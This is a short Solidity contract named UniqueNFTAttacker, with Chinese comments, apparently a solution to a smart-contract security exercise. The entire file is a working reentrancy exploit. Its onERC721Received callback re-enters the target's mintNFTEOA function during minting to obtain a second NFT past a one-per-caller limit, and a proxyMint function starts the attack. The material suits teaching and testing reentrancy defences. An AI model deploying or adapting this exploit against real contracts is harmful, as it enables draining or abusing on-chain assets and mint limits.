// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {IERC721Receiver} from "lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniqueNFT {
    function mintNFTEOA() external returns (uint256);
}

contract UniqueNFTAttacker is IERC721Receiver {
    address public immutable target;
    // 使用狀態變數來防止無限遞迴
    bool private _isReentering;

    constructor(address _target) {
        target = _target;
    }

    /**
     * @dev 當 UniqueNFT 執行 _mint 並透過 checkOnERC721Received 呼叫接收者時，
     * 此函數會被執行。
     */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        // 如果我們還沒重入過，就發動第二次 mint
        if (!_isReentering) {
            _isReentering = true;
            IUniqueNFT(target).mintNFTEOA();
        }
        
        return IERC721Receiver.onERC721Received.selector;
    }

    // 為了讓 EOA 能接收指令，我們需要補一個簡單的入口（可選，取決於如何調用）
    function proxyMint() external {
        IUniqueNFT(target).mintNFTEOA();
    }
}
